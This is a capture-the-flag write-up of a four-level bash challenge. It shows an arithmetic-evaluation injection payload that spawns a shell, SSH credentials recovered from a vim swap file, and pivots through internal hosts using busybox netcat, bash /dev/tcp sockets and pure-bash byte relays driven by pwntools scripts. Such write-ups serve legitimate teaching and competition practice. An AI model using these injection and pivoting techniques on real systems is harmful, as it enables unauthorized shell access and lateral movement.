I solved this awesome serie of CTF challenges with my team Kalmarunionen during TencentCTF

# mathexam

> The math exam starts now. Participate with integrity and never cheat.
> Someone has stolen the exam paper, and definitely he got full marks.
> Fortunately, he didn't find the flag. 

```bash
#!/bin/bash

echo "You are now in the math examination hall."
echo "First, please read exam integrity statement:"
echo ""

promisetext="I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment"
echo "$promisetext"
echo ""

echo "Now, write down the exam integrity statement here:"
read userinput

if [ "$userinput" = "$promisetext" ]
then
    echo "All right"
else
    echo "Error"
    exit
fi

echo ""
echo "Exam starts"
echo "(notice: numbers in dec, oct or hex format are all accepted)"
echo ""

correctcount=0
for i in {1..100}
do
    echo "Problem $i of 100:"
    echo "$i + $i = ?"

    ans=$(($i+$i))
    read line

    if [[ "$line" -eq "$ans" ]]
    then
        correctcount="$(($correctcount+1))"
    fi
    echo ""
done

echo "Exam finishes"
echo "You score is: $correctcount"

exit
```

## Level 1

This is my favourite [bash pitfall](https://mywiki.wooledge.org/BashPitfalls#A.5B.5B_.24foo_.3E_7_.5D.5D):

```bash
ans=$(($i+$i))
read line

if [[ "$line" -eq "$ans" ]]
   ...
fi
```

The code look so innocent, but writing bash is hard and dangerous!
When using `-eq` bash is put in math mode and`"$line"` is interpreted as a number, meaning e.g. `arr[X]` will evaluate `X` to get the index, so `arr[$(whoami)]` will be executed.

PoC to get a shell: `a[$(bash -c 'bash -i 1>&2')]`

```
$ cat flag1
## Yeah! You find the first flag:
##
## flag{_________________________________}
##
## But stop here, hacker! You should not see this file!
## And I won't tell you where the second flag is!
```

## Level 2

Using shell from level 1:

```
$ ls -al
drwxr-xr-x 1 0 0  4096 Dec 10 00:11 .
drwxr-xr-x 1 0 0  4096 Dec 10 00:11 ..
-rw-r--r-- 1 0 0 12288 Mar 17  2023 .connect.sh.swp
drwxr-xr-x 1 0 0  4096 Dec 10 00:11 bin
drwxr-xr-x 1 0 0  4096 Dec 10 10:46 etc
-rw-rw-r-- 1 0 0   359 Dec 10 00:10 flag1
drwxr-xr-x 3 0 0  4096 Dec  9 18:44 lib
drwxr-xr-x 2 0 0  4096 Dec  9 18:44 lib64
```

We see an `.swp` file from vim containing hints for the next flag.

```
$ /bin/busybox xxd .connect.sh.swp
00002fb0: 0000 0000 0000 0000 7373 6870 6173 7320  ........sshpass 
00002fc0: 2d70 2078 356b 646b 776a 7238 6578 6932  -p x5kdkwjr8exi2
00002fd0: 6266 3730 7938 6738 3062 6767 6432 6e75  bf70y8g80bggd2nu
00002fe0: 6570 6620 7373 6820 6374 6640 7365 636f  epf ssh ctf@seco
00002ff0: 6e64 0000 2321 2f62 696e 2f62 6173 6800  nd..#!/bin/bash.
```

So we need to SSH into host `second` using username `ctf` and password `x5kdkwjr8exi2bf70y8g80bggd2nuepf`.
But busybox is not compiled with SSH and the filesystem is readonly, so we can't put a static ssh binary.

**Trick**: We can use netcat (as part of busybox) to open a direct connection: `/bin/busybox nc $secondIp 22`.

How do we get the IP of second? Initially we guessed (based on ifconfig), but we can also use `wget` to show the IP:

```
$ busybox wget second
Connecting to second (10.10.20.2:80)
wget: can't connect to remote host (10.10.20.2): Connection refused
```

### Solution for level 2

```python
from pwn import *

# nc -X connect -x instance.0ctf2023.ctf.0ops.sjtu.cn:18081 89xergbg93m6vbfj 1
r = remote('instance.0ctf2023.ctf.0ops.sjtu.cn', 18081)
r.send(b'CONNECT hqgbfqxkptyxjmj9:1 HTTP/1.0\r\n\r\n')
r.recvline() # b'HTTP/1.1 200 OK\r\n'
r.recvuntil(b'Now, write down the exam integrity statement here:\n')

r.send(b"I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment\n")

r.recvuntil(b'1 + 1 = ?\n')

r.send(b"a[$(bash -c 'bash -i 1>&2')]\n")
r.recvuntil(b'bash: no job control in this shell\n')

#r.send(b"busybox wget second\n")
#r.recvuntil(b'inet 10.')

r.send(b"busybox nc 10.10.222.5 22\n")
r.recvline()  # b'bash-5.1$ busybox nc 10.7.40.5 22\n'

l = listen(2222)
print("ssh ctf@localhost -p2222")
svr = l.wait_for_connection()
svr.connect_both(r)
```

This will:
 * Use pwntools to open a shell to level 1
 * Use netcat to connect the _level 1 shell_ to _level 2 SSH server_
 * Wait for a connection on localhost (attacker)
 * Connect local connection stdin to remote connection stdin (and vice versa for stdout)

We can now `ssh ctf@localhost -p2222` to get a SSH shell on box 2.

```
$ cat flag2

## And the third flag is in another server.
## You can connect it by `ssh ctf@third` from this server using same password.
```

## Level 3

We have to redo the process from our _level 2 shell_, but this time we have no `busybox`, so no `wget` nor `netcat` 😿

Instead of using `nc` we can use this bash trick:

```bash
exec 3<>/dev/tcp/ip/port
echo "request" 1>&3
response="$(cat <&3)"
```

This will open `/dev/tcp/ip/port` to file descriptor 3 (in current shell) and keep it open (note: `/dev/` is not mounted in the box, but that doesn't matter as it isn't a real file).
We can then write to the file but redirecting stdout (fd 1) to the new fd 3 (`1 > &3`)
And we can read from the file (until EOF) by redirecting fd 3 to stdin (fd 0) by doing `< &3`

**Problem:** How do we get the IP of box 3?

### Rabbit hole: Manual DNS

Spoiler: Bash will automatically lookup the IP when opening `/dev/tcp/ip/port`, so you can skip this part:

```python
# Using shell from level 2:
r.send(b"exec 3<>/dev/udp/127.0.0.11/53\n")
dns_req = DNS(rd=1, qd=DNSQR(qname="third.sugon.server.sjtunic.org"))
r.send(dns_req.build())
```

We can manually craft the bytes needed to do a DNS request and open `/dev/udp/127.0.0.11/53` (we know box 2 has a DNS server on 127.0.0.11:53 from `/etc/resolv.conf`).

After spending a lot of time on this, I found out that bash will just lookup the correct IP when opening `/dev/tcp/third/22` ...

## Level 3 (cont.)

We can now open a new connection from box 2 to box 3, but to SSH into the box we need to be able to simultaneous read and write to the network stream.

**Problem**: How can we both read and write to this file?

If we cat fd 3 (the SSH connection to box 3), then it will be blocking and we can't write to the stream, but we can _cat fd 3_ (`cat <&3`) and then background the process (`&`)
Now everything sent from the SSH server on box 3 will be redirected to stdout (fd 1) on the level 2 shell, and our shell is ready to write new data any time.

Next trick is to turn _level 2 shell stdin_ (fd 0) (data from attacker's SSH client) to be redirected to fd 3 (connection to box 3 SSH server), by: `cat > &3`, this operation is blocking but that doesn't matter as the other (backgrounded) process will still write data to stdout (fd 1) 

PoC:
```bash
cat <&3 &
cat >&3
```

### Solution for level 3

**Note**: For this to work, you need to configure your local SSH client to enable connection multiplexing ("ControlMaster") and have the level 2 script running in the background and an active connection to box 2.

```python
from pwn import *

p = process(['ssh', 'ctf@localhost', '-p2222'])
p.recvline() # Pseudo-terminal will not ...

### DNS because I didnt know /dev/tcp/.../port would look up domains... ###
#from scapy.all import DNS, DNSQR, IP, UDP
#p.send("exec 666<>/dev/udp/127.0.0.11/53\n".encode())
#dns_req = DNS(rd=1337, qd=DNSQR(qname='third'))
#p.send(b"cat <&666 &\n")
#p.send(b"cat >&666\n")
#p.send(dns_req.build())
#print(DNS(p.recv()))

p.send(b"exec 3<>/dev/tcp/third/22\n")
p.send(b"cat <&3 &\n")
p.send(b"cat >&3\n")
l = listen(2223)
print("ssh ctf@localhost -p2223  # pw: x5kdkwjr8exi2bf70y8g80bggd2nuepf")
svr = l.wait_for_connection()
svr.connect_both(p)
```

We can now `ssh ctf@localhost -p2223` to get a SSH shell on box 3.

```
$ ls
bin  etc  flag3  lib  lib64
$ cat flag3
bash: cat: command not found
```

## Level 4

First they took our `busybox`, but I had `cat`, then they took my `cat` 🙀

We can use bash to open a file and pipe file content to stdin by doing `... < flag3`, then we can use bash buildin `read` to read from stdin into a variable (`$line`) and then use bash buildin `echo` to write the variable to stdout (fd 1):

```bash
$ while read line; do echo $line; done < flag3

## This is the third flag:
##
## flag{________________________________}
##
## How much code do you write for solving the three levels?
## Actually, using only pure bash shell script is enough to archieve the goal!
## Have a try!
## Connect to fourth server by `ssh ctf@fourth` from here with same password.
```

![Friendship ended with cat, now bash readline is my best friend](./cat-meme.png)

**Problem**

We used this trick to turn stdin/stdout into a bidirectional pipe. But we can't use `cat` anymore. 
```bash
cat <&3 &
cat >&3
```

Using the above trick (to cat `flag3`) we can "cat" a file, but bash will read until a null byte or newlines and collapse multiple spaces, so we need to take special care of that.

Instead of creating a backgrounded (`&`) cat process to redirect fd 3 (SSH server on box 4) to fd 1 (attacker SSH client), we use this beautiful bash command:

```bash
while true; do IFS='' read -d '' -n 1 -r u; if [ "${#u}" -eq 0 ]; then echo -en "\x00"; fi; echo -n "$u"; done <&3 &
#                                                                                                              ^^^ Read from fd 3
#^^^^^^^^^^^^^ Forever (while true) read one byte at a time                                               ^^^^
#              ^^^^^^ Set Internal Field Separator to none, to avoid collapsing (multiple) spaces
#                     ^^^^^^^^^^^^^^^^^^^^ read
#                                               -d ''   read until a NULL byte
#                                               -n 1    return after reading a single char
#                                               -r      don't handle backslash as escape chars
#                                               u       save result in variable $u
#                                           ^^^^^^^^^^^^^^^^^^^^ Check the length of $u
#                                                                 ^^^^^^^^^^^^^^^^^^^^ If len($u) is 0, then we read a NULL byte, output a NULL to stdout
#                                                                                           ^^^^^^^^^^^^ Otherwise output the read byte to stdout
#                                                                                                                  ^ Background process so it isn't blocking
```

And vice versa for redirecting attacker SSH client to box 4 SSH server we can replace

```bash
cat >&3
# replace with:
while true; do IFS='' read -d '' -n 1 -r u; if [ "${#u}" -eq 0 ]; then echo -en "\x00"; fi; echo -n "$u"; done >&3
```

### Solution for level 4

```python
from pwn import *

p = process(['ssh', 'ctf@localhost', '-p2223'])
print(p.recvline()) # Pseudo-terminal will not ...

p.send(b"exec 3<>/dev/tcp/fourth/22\n")

p.send(b"""while true; do IFS='' read -d '' -n 1 -r u; if [ "${#u}" -eq 0 ]; then echo -en "\\x00"; fi; echo -n "$u"; done <&3 &\n""")
p.send(b"""while true; do IFS='' read -d '' -n 1 -r u; if [ "${#u}" -eq 0 ]; then echo -en "\\x00"; fi; echo -n "$u"; done >&3\n""")

l = listen(2224)
print("ssh ctf@localhost -p 2224")
svr = l.wait_for_connection()
svr.connect_both(p)
```

And finally:

```
# requires level 3 to be running
$ ssh ctf@localhost -p 2224
$ ls
bash: ls: command not found
$ while read line; do echo $line; done < flag4
```

# Solution overview

[![](https://mermaid.ink/img/pako:eNqVUstugzAQ_JWVW6FWSkCB5FA3QmrVY289lh4We1tQwKbGpERR_r0g8oCQSO1evJ6dGY-l3TKhJTHOSvquSAl6SfHLYB4paAqF1QaerEWxItNhmdYFvNKaMph1SFsHzjQMn3U944Dvt3cxlsn9x4nUk_ontK1W00l9DnFVbmJdgxJQktBKgn9G7xkFw8nezJ92bgEHqklAsAw9SWvPisKzSWqkd245Fgq0sHQCcK4Q-7zQuZCjl3I-nu59gv2D838lHYt_kjQjsKaim8XDI0gNrus2h6Jrnzh6_MHi4v9IySE4AI6XpmETlpPJMZXNpm1bOGI2oZwixptWollFLFK7hoeV1W8bJRhvg0xYVUi0h61k_BOzkna_8IG3ng?type=png)](https://mermaid.live/edit#pako:eNqVUstugzAQ_JWVW6FWSkCB5FA3QmrVY289lh4We1tQwKbGpERR_r0g8oCQSO1evJ6dGY-l3TKhJTHOSvquSAl6SfHLYB4paAqF1QaerEWxItNhmdYFvNKaMph1SFsHzjQMn3U944Dvt3cxlsn9x4nUk_ontK1W00l9DnFVbmJdgxJQktBKgn9G7xkFw8nezJ92bgEHqklAsAw9SWvPisKzSWqkd245Fgq0sHQCcK4Q-7zQuZCjl3I-nu59gv2D838lHYt_kjQjsKaim8XDI0gNrus2h6Jrnzh6_MHi4v9IySE4AI6XpmETlpPJMZXNpm1bOGI2oZwixptWollFLFK7hoeV1W8bJRhvg0xYVUi0h61k_BOzkna_8IG3ng)
